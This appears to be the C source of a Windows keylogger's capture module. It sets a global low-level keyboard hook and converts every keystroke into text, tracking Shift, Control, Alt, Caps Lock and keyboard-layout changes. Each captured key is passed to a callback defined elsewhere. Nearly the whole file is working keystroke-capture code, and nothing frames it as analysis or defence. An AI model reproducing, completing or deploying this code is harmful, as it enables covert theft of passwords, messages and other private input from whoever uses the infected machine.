#include "keylogger.h"
#include "dictionary.h"

keyloggerCallback callback; //a callback that will be called when the key is pressed and processed
HHOOK keyboardHook = NULL; //the keyboard hook

//flags to handle key combinations and capital setters
u8 lShiftPressed = 0, rShiftPressed = 0, keyAfterShift = 1;
u8 lControlPressed = 0, rControlPressed = 0, keyAfterControl = 1;
u8 lAltPressed = 0, rAltPressed = 0, keyAfterAlt = 1;

char chr[65] = {0}; //a buffer to store the processed key
HKL lastKeyboardLayout; //the keyboard layout that was used in the last key event

/*
    Transform a text to upper case
    buffer: a pointer to a buffer with the text to transform
*/
void toUpperCase(char* buffer) {
    u32 len = strlen(buffer);
    for (u32 i = 0; i < len; i++) {
        u8 c = (u8)buffer[i];
        if (c >= 0x61 && c <= 0x7A) {
            c -= 0x20;
        } else if (c >= 0xE0 && c <= 0xFD) {
            c -= 0x20;
        }
        buffer[i] = (char) c;
    }
}

/*
    Transform a text to lower case
    buffer: a pointer to a buffer with the text to transform
*/
void toLowerCase(char* buffer) {
    u32 len = strlen(buffer);
    for (u32 i = 0; i < len; i++) {
        u8 c = (u8)buffer[i];
        if (c >= 0x41 && c <= 0x5A) {
            c += 0x20;
        } else if (c >= 0xC0 && c <= 0xDD) {
            c += 0x20;
        }
        buffer[i] = (char) c;
    }
}

/*
    Get the name of a given key
    vkCode: the key
    buffer: a pointer to a buffer to save the name
    size: the size of the buffer
*/
int getKeyName(u32 vkCode, char* buffer, u32 size) {
    u32 vsc = MapVirtualKey(vkCode, 0); //MAPVK_VK_TO_VSC
    switch (vkCode) {
        case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
        case VK_PRIOR: case VK_NEXT:
        case VK_END: case VK_HOME:
        case VK_INSERT: case VK_DELETE:
        case VK_DIVIDE:
        case VK_NUMLOCK: {
            vsc |= 0x100; //Set extended bit
            break;
        }
    }
    if (GetKeyNameText(vsc * 0x10000, buffer, size) == 0) {
        return 1;
    }
    return 0;
}

/*
    A function to precess the key
    key: the key that was pressed
*/

void dictionary(u32 key) {
    //Map the keyboard to a character and check if alt, shift or control was pressed
    memset(chr, 0, 65);
    u8 test = MapVirtualKey(key, 2); //MAPVK_VK_TO_CHAR
    u8 shift = 0, alt = 0, control = 0;
    if (lShiftPressed == 1 || rShiftPressed == 1) shift = 1;
    if (lAltPressed == 1 || rAltPressed == 1) alt = 1;
    if (lControlPressed == 1 || rControlPressed == 1) control = 1;
    char ret = getCharFromCombination(key, control, alt, shift); //Map the key, but with the combination keys
    if (ret > 0) { //Method 1: if a character translation is available
        //Mark as a key combination
        if (shift == 1) keyAfterShift = 1;
        if (alt == 1) keyAfterAlt = 1;
        if (control == 1) keyAfterControl = 1;
        chr[0] = ret; //Get the dumped key
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) { //check for capital letters
            if (shift == 1) toLowerCase(chr);
            if (shift == 0) toUpperCase(chr);
        }
    } else if ((test >= 0x20 && test <= 0xFE) && test != 0x7F) { //Method 2: if there was not key available, check if the character is printable
        if ((test >= 0x41 && test <= 0x5A) || (test >= 0x61 && test <= 0x7A) ||
            (test >= 0xC0 && test <= 0xDD) || (test >= 0xE0 && test <= 0xFD)) {
            keyAfterShift = 1; //mark as a key combination
        }
        //check for capital letters
        u8 isCap = 0;
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
            isCap = 1;
        }
        if (shift == 1) isCap = 1 - isCap;
        chr[0] = test;
        if (isCap == 1) {
            toUpperCase(chr);
        } else {
            toLowerCase(chr);
        }
    } else { //Method 3: the key should be an special key (enter, escape...) so get it's name
        char keyName[65];
        if (getKeyName(key, keyName, 65) == 1) { //get the name
            //and if the key doesn't have a name, simply use UNKNOWN KEY
            memset(keyName, 0, 65);
            strcpy(keyName, "UNKNOWN KEY");
        }
        //Put the name inside brackets
        chr[0] = '[';
        strcpy(chr + 1, keyName);
        chr[strlen(chr)] = ']';
    }
}

/*
    Keyboard pulsation handler
    code: action code.
    wParam: the event action.
    lParam: in this case, the key that was pressed.
*/
LRESULT CALLBACK keyloggerHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        HKL currentKeyboardLayout = GetKeyboardLayout(NULL);
        if (lastKeyboardLayout != currentKeyboardLayout) {
            log("The keyboard layout has changed.");
            lastKeyboardLayout = currentKeyboardLayout;
            constructKeyDictionary();
        }
        KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*) lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) { //if the key has been pressed
            if (key->vkCode == VK_LSHIFT) { //activate the left shift flag
                lShiftPressed = 1;
                keyAfterShift = 0;
            } else if (key->vkCode == VK_RSHIFT) { //activate the right shift flag
                rShiftPressed = 1;
                keyAfterShift = 0;
            } else if (key->vkCode == VK_LCONTROL) {//activate the left control flag
                lControlPressed = 1;
                keyAfterControl = 0;
            } else if (key->vkCode == VK_RCONTROL) { //activate the right control flag
                rControlPressed = 1;
                keyAfterControl = 0;
            } else if (key->vkCode == VK_LMENU) { //activate the left alt flag
                lAltPressed = 1;
                keyAfterAlt = 0;
            } else if (key->vkCode == VK_RMENU) { //activate the right alt flag
                rAltPressed = 1;
                keyAfterAlt = 0;
            } else { //if none of the key combination keys was pressed
                dictionary(key->vkCode); //process the key, convert it to text
                callback(chr); //call the callback function defined in startKeylogger
            }
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) { //if the key has been released
            if (key->vkCode == VK_LSHIFT) { //deactivate the left shift flag
                lShiftPressed = 0;
                if (keyAfterShift == 0) { //if there was no key combination
                    keyAfterShift = 1;
                    dictionary(key->vkCode); //process the key, convert it to text
                    callback(chr); //call the callback function defined in startKeylogger
                }
            } else if (key->vkCode == VK_RSHIFT) { //deactivate the right shift flag
                rShiftPressed = 0;
                if (keyAfterShift == 0) { //if there was no key combination
                    keyAfterShift = 1;
                    dictionary(key->vkCode); //process the key, convert it to text
                    callback(chr); //call the callback function defined in startKeylogger
                }
            } else if (key->vkCode == VK_LCONTROL) { //deactivate the left control flag
                lControlPressed = 0;
                if (keyAfterControl == 0) { //if there was no key combination
                    keyAfterControl = 1;
                    dictionary(key->vkCode); //process the key, convert it to text
                    callback(chr); //call the callback function defined in startKeylogger
                }
            } else if (key->vkCode == VK_RCONTROL) { //deactivate the right control flag
                rControlPressed = 0;
                if (keyAfterControl == 0) { //if there was no key combination
                    keyAfterControl = 1;
                    dictionary(key->vkCode); //process the key, convert it to text
                    callback(chr); //call the callback function defined in startKeylogger
                }
            } else if (key->vkCode == VK_LMENU) { //deactivate the left alt flag
                lAltPressed = 0;
                if (keyAfterAlt == 0) { //if there was no key combination
                    keyAfterAlt = 1;
                    dictionary(key->vkCode); //process the key, convert it to text
                    callback(chr); //call the callback function defined in startKeylogger
                }
            } else if (key->vkCode == VK_RMENU) { //deactivate the right alt flag
                rAltPressed = 0;
                if (keyAfterAlt == 0) { //if there was no key combination
                    keyAfterAlt = 1;
                    dictionary(key->vkCode); //process the key, convert it to text
                    callback(chr); //call the callback function defined in startKeylogger
                }
            }
        }
    }
    return CallNextHookEx(keyboardHook, code, wParam, lParam);
}

/*
    This function has the main loop of the keyboard hook.
    hInstance: the instance handler of the application.
    cb: a callback function that will be executed when a key is pressed and processed.
*/
void startKeylogger(HINSTANCE hInstance, keyloggerCallback cb) {
    lastKeyboardLayout = GetKeyboardLayout(NULL);
    constructKeyDictionary();
    callback = cb;
    log("Setting the keyboard hook...");
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyloggerHook, hInstance, NULL);
    MSG msg;
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    log("Unhooking the keyboard hook and exiting the keylogger...");
    UnhookWindowsHookEx(keyboardHook);
}
